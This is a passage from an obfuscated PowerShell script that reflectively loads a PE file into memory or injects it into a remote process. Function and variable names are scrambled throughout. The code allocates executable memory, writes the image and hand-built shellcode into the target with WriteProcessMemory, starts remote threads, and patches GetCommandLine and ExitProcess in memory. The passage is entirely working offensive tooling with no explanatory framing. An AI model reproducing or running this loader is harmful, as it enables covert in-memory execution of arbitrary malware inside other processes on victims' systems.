		$cxFnWjaC99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$bRkXQtLA99 = [IntPtr](Balzac ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.IMAGE_SECTION_HEADER)))
			$CkAQXycf99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($bRkXQtLA99, [Type]$DIEZeRqh99.IMAGE_SECTION_HEADER)
			[IntPtr]$OTIXhFGu99 = Balzac ($PEInfo.PEHandle) ($CkAQXycf99.VirtualAddress)
			
			[UInt32]$zCIslUmT99 = spite $CkAQXycf99.Characteristics
			[UInt32]$QTqNPskn99 = $CkAQXycf99.VirtualSize
			
			[UInt32]$NDVsgGJj99 = 0
			Ferris -zTyLmNSe99 "hook::VirtualProtect" -PEInfo $PEInfo -StartAddress $OTIXhFGu99 -Size $QTqNPskn99 | Out-Null
			$FdJKwcrL99 = $cxFnWjaC99.VirtualProtect.Invoke($OTIXhFGu99, $QTqNPskn99, $zCIslUmT99, [Ref]$NDVsgGJj99)
			if ($FdJKwcrL99 -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	Function panhandles
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$cxFnWjaC99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$wOYreuMh99,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$qVuOlrqv99
		)
		
		$PddRMqUA99 = @() 
		
		$hcnzPZxK99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$NDVsgGJj99 = 0
		
		[IntPtr]$DSQYoQoB99 = $cxFnWjaC99.GetModuleHandle.Invoke("Kernel32.dll")
		if ($DSQYoQoB99 -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$pYnzJsrC99 = $cxFnWjaC99.GetModuleHandle.Invoke("KernelBase.dll")
		if ($pYnzJsrC99 -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		$sKWsLiCc99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($wOYreuMh99)
		$eScDMKqs99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($wOYreuMh99)
	
		[IntPtr]$kbmcRufM99 = $cxFnWjaC99.GetProcAddress.Invoke($pYnzJsrC99, "GetCommandLineA")
		[IntPtr]$VrXsvYxr99 = $cxFnWjaC99.GetProcAddress.Invoke($pYnzJsrC99, "GetCommandLineW")
		if ($kbmcRufM99 -eq [IntPtr]::Zero -or $VrXsvYxr99 -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $kbmcRufM99. GetCommandLineW: $VrXsvYxr99"
		}
		[Byte[]]$OkRXYoBK99 = @()
		if ($hcnzPZxK99 -eq 8)
		{
			$OkRXYoBK99 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$OkRXYoBK99 += 0xb8
		
		[Byte[]]$yPmPOkhk99 = @(0xc3)
		$TlWFFeLr99 = $OkRXYoBK99.Length + $hcnzPZxK99 + $yPmPOkhk99.Length
		
		
		$YyFZuRZV99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TlWFFeLr99)
		$cUDmENri99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TlWFFeLr99)
		$cxFnWjaC99.memcpy.Invoke($YyFZuRZV99, $kbmcRufM99, [UInt64]$TlWFFeLr99) | Out-Null
		$cxFnWjaC99.memcpy.Invoke($cUDmENri99, $VrXsvYxr99, [UInt64]$TlWFFeLr99) | Out-Null
		$PddRMqUA99 += ,($kbmcRufM99, $YyFZuRZV99, $TlWFFeLr99)
		$PddRMqUA99 += ,($VrXsvYxr99, $cUDmENri99, $TlWFFeLr99)
		[UInt32]$NDVsgGJj99 = 0
		$FdJKwcrL99 = $cxFnWjaC99.VirtualProtect.Invoke($kbmcRufM99, [UInt32]$TlWFFeLr99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$NDVsgGJj99)
		if ($FdJKwcrL99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$NqbzyYpM99 = $kbmcRufM99
		avuncular -Bytes $OkRXYoBK99 -qxCLnUIL99 $NqbzyYpM99
		$NqbzyYpM99 = Balzac $NqbzyYpM99 ($OkRXYoBK99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($eScDMKqs99, $NqbzyYpM99, $false)
		$NqbzyYpM99 = Balzac $NqbzyYpM99 $hcnzPZxK99
		avuncular -Bytes $yPmPOkhk99 -qxCLnUIL99 $NqbzyYpM99
		
		$cxFnWjaC99.VirtualProtect.Invoke($kbmcRufM99, [UInt32]$TlWFFeLr99, [UInt32]$NDVsgGJj99, [Ref]$NDVsgGJj99) | Out-Null
		
		
		[UInt32]$NDVsgGJj99 = 0
		$FdJKwcrL99 = $cxFnWjaC99.VirtualProtect.Invoke($VrXsvYxr99, [UInt32]$TlWFFeLr99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$NDVsgGJj99)
		if ($FdJKwcrL99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$OLGXEBMI99 = $VrXsvYxr99
		avuncular -Bytes $OkRXYoBK99 -qxCLnUIL99 $OLGXEBMI99
		$OLGXEBMI99 = Balzac $OLGXEBMI99 ($OkRXYoBK99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($sKWsLiCc99, $OLGXEBMI99, $false)
		$OLGXEBMI99 = Balzac $OLGXEBMI99 $hcnzPZxK99
		avuncular -Bytes $yPmPOkhk99 -qxCLnUIL99 $OLGXEBMI99
		
		$cxFnWjaC99.VirtualProtect.Invoke($VrXsvYxr99, [UInt32]$TlWFFeLr99, [UInt32]$NDVsgGJj99, [Ref]$NDVsgGJj99) | Out-Null
		
		
		$febgqpYr99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $febgqpYr99)
		{
			[IntPtr]$XhTWxKmd99 = $cxFnWjaC99.GetModuleHandle.Invoke($Dll)
			if ($XhTWxKmd99 -ne [IntPtr]::Zero)
			{
				[IntPtr]$krBEopIW99 = $cxFnWjaC99.GetProcAddress.Invoke($XhTWxKmd99, "_wcmdln")
				[IntPtr]$PrEfGsPQ99 = $cxFnWjaC99.GetProcAddress.Invoke($XhTWxKmd99, "_acmdln")
				if ($krBEopIW99 -eq [IntPtr]::Zero -or $PrEfGsPQ99 -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$KohAHOKJ99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($wOYreuMh99)
				$gyrOOtFW99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($wOYreuMh99)
				
				$QhJfGjTy99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PrEfGsPQ99, [Type][IntPtr])
				$aaCHLCtD99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($krBEopIW99, [Type][IntPtr])
				$DNhFinoG99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($hcnzPZxK99)
				$qtiuvNBK99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($hcnzPZxK99)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($QhJfGjTy99, $DNhFinoG99, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($aaCHLCtD99, $qtiuvNBK99, $false)
				$PddRMqUA99 += ,($PrEfGsPQ99, $DNhFinoG99, $hcnzPZxK99)
				$PddRMqUA99 += ,($krBEopIW99, $qtiuvNBK99, $hcnzPZxK99)
				
				$FdJKwcrL99 = $cxFnWjaC99.VirtualProtect.Invoke($PrEfGsPQ99, [UInt32]$hcnzPZxK99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$NDVsgGJj99)
				if ($FdJKwcrL99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($KohAHOKJ99, $PrEfGsPQ99, $false)
				$cxFnWjaC99.VirtualProtect.Invoke($PrEfGsPQ99, [UInt32]$hcnzPZxK99, [UInt32]($NDVsgGJj99), [Ref]$NDVsgGJj99) | Out-Null
				
				$FdJKwcrL99 = $cxFnWjaC99.VirtualProtect.Invoke($krBEopIW99, [UInt32]$hcnzPZxK99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$NDVsgGJj99)
				if ($FdJKwcrL99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($gyrOOtFW99, $krBEopIW99, $false)
				$cxFnWjaC99.VirtualProtect.Invoke($krBEopIW99, [UInt32]$hcnzPZxK99, [UInt32]($NDVsgGJj99), [Ref]$NDVsgGJj99) | Out-Null
			}
		}
		
		
		$PddRMqUA99 = @()
		$xugvlweE99 = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		[IntPtr]$EuwiFVyK99 = $cxFnWjaC99.GetModuleHandle.Invoke("mscoree.dll")
		if ($EuwiFVyK99 -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$MtMeUNGM99 = $cxFnWjaC99.GetProcAddress.Invoke($EuwiFVyK99, "CorExitProcess")
		if ($MtMeUNGM99 -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$xugvlweE99 += $MtMeUNGM99
		
		[IntPtr]$FnnpOOAo99 = $cxFnWjaC99.GetProcAddress.Invoke($DSQYoQoB99, "ExitProcess")
		if ($FnnpOOAo99 -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$xugvlweE99 += $FnnpOOAo99
		
		[UInt32]$NDVsgGJj99 = 0
		foreach ($qAoHBGHC99 in $xugvlweE99)
		{
			$yCyuRMhk99 = $qAoHBGHC99
			[Byte[]]$OkRXYoBK99 = @(0xbb)
			[Byte[]]$yPmPOkhk99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if ($hcnzPZxK99 -eq 8)
			{
				[Byte[]]$OkRXYoBK99 = @(0x48, 0xbb)
				[Byte[]]$yPmPOkhk99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$fPWlbTct99 = @(0xff, 0xd3)
			$TlWFFeLr99 = $OkRXYoBK99.Length + $hcnzPZxK99 + $yPmPOkhk99.Length + $hcnzPZxK99 + $fPWlbTct99.Length
			
			[IntPtr]$gXuptxto99 = $cxFnWjaC99.GetProcAddress.Invoke($DSQYoQoB99, "ExitThread")
			if ($gXuptxto99 -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			$FdJKwcrL99 = $cxFnWjaC99.VirtualProtect.Invoke($qAoHBGHC99, [UInt32]$TlWFFeLr99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$NDVsgGJj99)
			if ($FdJKwcrL99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$KleJxHMc99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TlWFFeLr99)
			$cxFnWjaC99.memcpy.Invoke($KleJxHMc99, $qAoHBGHC99, [UInt64]$TlWFFeLr99) | Out-Null
			$PddRMqUA99 += ,($qAoHBGHC99, $KleJxHMc99, $TlWFFeLr99)
			
			avuncular -Bytes $OkRXYoBK99 -qxCLnUIL99 $yCyuRMhk99
			$yCyuRMhk99 = Balzac $yCyuRMhk99 ($OkRXYoBK99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($qVuOlrqv99, $yCyuRMhk99, $false)
			$yCyuRMhk99 = Balzac $yCyuRMhk99 $hcnzPZxK99
			avuncular -Bytes $yPmPOkhk99 -qxCLnUIL99 $yCyuRMhk99
			$yCyuRMhk99 = Balzac $yCyuRMhk99 ($yPmPOkhk99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($gXuptxto99, $yCyuRMhk99, $false)
			$yCyuRMhk99 = Balzac $yCyuRMhk99 $hcnzPZxK99
			avuncular -Bytes $fPWlbTct99 -qxCLnUIL99 $yCyuRMhk99
			$cxFnWjaC99.VirtualProtect.Invoke($qAoHBGHC99, [UInt32]$TlWFFeLr99, [UInt32]$NDVsgGJj99, [Ref]$NDVsgGJj99) | Out-Null
		}
		Write-Output $PddRMqUA99
	}
	
	
	Function mangrove
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$AuxZJATW99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$cxFnWjaC99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]$NDVsgGJj99 = 0
		foreach ($Info in $AuxZJATW99)
		{
			$FdJKwcrL99 = $cxFnWjaC99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$NDVsgGJj99)
			if ($FdJKwcrL99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$cxFnWjaC99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$cxFnWjaC99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$NDVsgGJj99, [Ref]$NDVsgGJj99) | Out-Null
		}
	}
	Function browned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$wGyvvcQf99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$DIEZeRqh99 = stroked
		$Win32Constants = toed
		$PEInfo = splays -wGyvvcQf99 $wGyvvcQf99 -DIEZeRqh99 $DIEZeRqh99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$IfoziawZ99 = Balzac ($wGyvvcQf99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$rLKkTsVN99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IfoziawZ99, [Type]$DIEZeRqh99.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $rLKkTsVN99.NumberOfNames; $i++)
		{
			$eLQuPyyB99 = Balzac ($wGyvvcQf99) ($rLKkTsVN99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$jdBvpZPT99 = Balzac ($wGyvvcQf99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($eLQuPyyB99, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($jdBvpZPT99)
			if ($Name -ceq $FunctionName)
			{
				$EiTnhzEc99 = Balzac ($wGyvvcQf99) ($rLKkTsVN99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$VBokOtUJ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($EiTnhzEc99, [Type][UInt16])
				$fWkOLEiC99 = Balzac ($wGyvvcQf99) ($rLKkTsVN99.AddressOfFunctions + ($VBokOtUJ99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$vVhJmjbQ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fWkOLEiC99, [Type][UInt32])
				return Balzac ($wGyvvcQf99) ($vVhJmjbQ99)
			}
		}
		
		return [IntPtr]::Zero
	}
	Function potted
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$IKHGtPzF99,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$vamjTknO99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$lRZKwtTF99
		)
		
		$hcnzPZxK99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$Win32Constants = toed
		$cxFnWjaC99 = filbert
		$DIEZeRqh99 = stroked
		
		$qUiHNsTk99 = $false
		if (($lRZKwtTF99 -ne $null) -and ($lRZKwtTF99 -ne [IntPtr]::Zero))
		{
			$qUiHNsTk99 = $true
		}
		
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = demagoguery -IKHGtPzF99 $IKHGtPzF99 -DIEZeRqh99 $DIEZeRqh99
		$DtuimMSd99 = $PEInfo.OriginalImageBase
		$gwXKIgAY99 = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$gwXKIgAY99 = $false
		}
		
		
		$fwemxUUm99 = $true
		if ($qUiHNsTk99 -eq $true)
		{
			$DSQYoQoB99 = $cxFnWjaC99.GetModuleHandle.Invoke("kernel32.dll")
			$rXPLntYP99 = $cxFnWjaC99.GetProcAddress.Invoke($DSQYoQoB99, "IsWow64Process")
			if ($rXPLntYP99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$UnXFjgEa99 = $false
			$FdJKwcrL99 = $cxFnWjaC99.IsWow64Process.Invoke($lRZKwtTF99, [Ref]$UnXFjgEa99)
			if ($FdJKwcrL99 -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($UnXFjgEa99 -eq $true) -or (($UnXFjgEa99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$fwemxUUm99 = $false
			}
			
			$UpxAyuej99 = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$UpxAyuej99 = $false
			}
			if ($UpxAyuej99 -ne $fwemxUUm99)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$fwemxUUm99 = $false
			}
		}
		if ($fwemxUUm99 -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$QPTWKfSZ99 = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$QPTWKfSZ99 = $DtuimMSd99
		}
		$wGyvvcQf99 = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$PnPRzbmk99 = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $wGyvvcQf99. If it is loaded in a remote process, this is the address in the remote process.
		if ($qUiHNsTk99 -eq $true)
		{
			$wGyvvcQf99 = $cxFnWjaC99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			$PnPRzbmk99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, $QPTWKfSZ99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($PnPRzbmk99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($gwXKIgAY99 -eq $true)
			{
				$wGyvvcQf99 = $cxFnWjaC99.VirtualAlloc.Invoke($QPTWKfSZ99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$wGyvvcQf99 = $cxFnWjaC99.VirtualAlloc.Invoke($QPTWKfSZ99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$PnPRzbmk99 = $wGyvvcQf99
		}
		
		[IntPtr]$bykAanQM99 = Balzac ($wGyvvcQf99) ([Int64]$PEInfo.SizeOfImage)
		if ($wGyvvcQf99 -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($IKHGtPzF99, 0, $wGyvvcQf99, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = splays -wGyvvcQf99 $wGyvvcQf99 -DIEZeRqh99 $DIEZeRqh99 -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $bykAanQM99
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $PnPRzbmk99
		Write-Verbose "StartAddress: $wGyvvcQf99    EndAddress: $bykAanQM99"
		
		
		Write-Verbose "Copy PE sections in to memory"
		reassured -IKHGtPzF99 $IKHGtPzF99 -PEInfo $PEInfo -cxFnWjaC99 $cxFnWjaC99 -DIEZeRqh99 $DIEZeRqh99
		
		
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		trumpeted -PEInfo $PEInfo -DtuimMSd99 $DtuimMSd99 -Win32Constants $Win32Constants -DIEZeRqh99 $DIEZeRqh99
		
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($qUiHNsTk99 -eq $true)
		{
			drowns -PEInfo $PEInfo -cxFnWjaC99 $cxFnWjaC99 -DIEZeRqh99 $DIEZeRqh99 -Win32Constants $Win32Constants -lRZKwtTF99 $lRZKwtTF99
		}
		else
		{
			drowns -PEInfo $PEInfo -cxFnWjaC99 $cxFnWjaC99 -DIEZeRqh99 $DIEZeRqh99 -Win32Constants $Win32Constants
		}
		
		
		if ($qUiHNsTk99 -eq $false)
		{
			if ($gwXKIgAY99 -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				hook -PEInfo $PEInfo -cxFnWjaC99 $cxFnWjaC99 -Win32Constants $Win32Constants -DIEZeRqh99 $DIEZeRqh99
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		if ($qUiHNsTk99 -eq $true)
		{
			[UInt32]$VDMWjOMd99 = 0
			$FdJKwcrL99 = $cxFnWjaC99.WriteProcessMemory.Invoke($lRZKwtTF99, $PnPRzbmk99, $wGyvvcQf99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$VDMWjOMd99)
			if ($FdJKwcrL99 -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($qUiHNsTk99 -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$yBtzFgSy99 = Balzac ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$XKeWHnnA99 = bucksaws @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$vzdlVxrF99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yBtzFgSy99, $XKeWHnnA99)
				
				$vzdlVxrF99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$yBtzFgSy99 = Balzac ($PnPRzbmk99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					$IGnkXtdi99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$equGKXzi99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$iQYTJHoW99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					$IGnkXtdi99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$equGKXzi99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$iQYTJHoW99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$yCzBTvfu99 = $IGnkXtdi99.Length + $equGKXzi99.Length + $iQYTJHoW99.Length + ($hcnzPZxK99 * 2)
				$vHNoXGpY99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($yCzBTvfu99)
				$vscvdxpI99 = $vHNoXGpY99
				
				avuncular -Bytes $IGnkXtdi99 -qxCLnUIL99 $vHNoXGpY99
				$vHNoXGpY99 = Balzac $vHNoXGpY99 ($IGnkXtdi99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($PnPRzbmk99, $vHNoXGpY99, $false)
				$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
				avuncular -Bytes $equGKXzi99 -qxCLnUIL99 $vHNoXGpY99
				$vHNoXGpY99 = Balzac $vHNoXGpY99 ($equGKXzi99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($yBtzFgSy99, $vHNoXGpY99, $false)
				$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
				avuncular -Bytes $iQYTJHoW99 -qxCLnUIL99 $vHNoXGpY99
				$vHNoXGpY99 = Balzac $vHNoXGpY99 ($iQYTJHoW99.Length)
				
				$VRKikwti99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, [IntPtr]::Zero, [UIntPtr][UInt64]$yCzBTvfu99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($VRKikwti99 -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$FdJKwcrL99 = $cxFnWjaC99.WriteProcessMemory.Invoke($lRZKwtTF99, $VRKikwti99, $vscvdxpI99, [UIntPtr][UInt64]$yCzBTvfu99, [Ref]$VDMWjOMd99)
				if (($FdJKwcrL99 -eq $false) -or ([UInt64]$VDMWjOMd99 -ne [UInt64]$yCzBTvfu99))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				$ESMoqUGA99 = utopia -vVbfBzxt99 $lRZKwtTF99 -StartAddress $VRKikwti99 -cxFnWjaC99 $cxFnWjaC99
				$rXPLntYP99 = $cxFnWjaC99.WaitForSingleObject.Invoke($ESMoqUGA99, 20000)
				if ($rXPLntYP99 -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$cxFnWjaC99.VirtualFreeEx.Invoke($lRZKwtTF99, $VRKikwti99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$qVuOlrqv99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($qVuOlrqv99, 0, 0x00)
			$ONfylPXN99 = panhandles -PEInfo $PEInfo -cxFnWjaC99 $cxFnWjaC99 -Win32Constants $Win32Constants -wOYreuMh99 $vamjTknO99 -qVuOlrqv99 $qVuOlrqv99
			[IntPtr]$zdGESidQ99 = Balzac ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $zdGESidQ99. Creating thread for the EXE to run in."
			$cxFnWjaC99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $zdGESidQ99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$zNXkojHy99 = [System.Runtime.InteropServices.Marshal]::ReadByte($qVuOlrqv99, 0)
				if ($zNXkojHy99 -eq 1)
				{
					mangrove -AuxZJATW99 $ONfylPXN99 -cxFnWjaC99 $cxFnWjaC99 -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $PnPRzbmk99)
	}
	
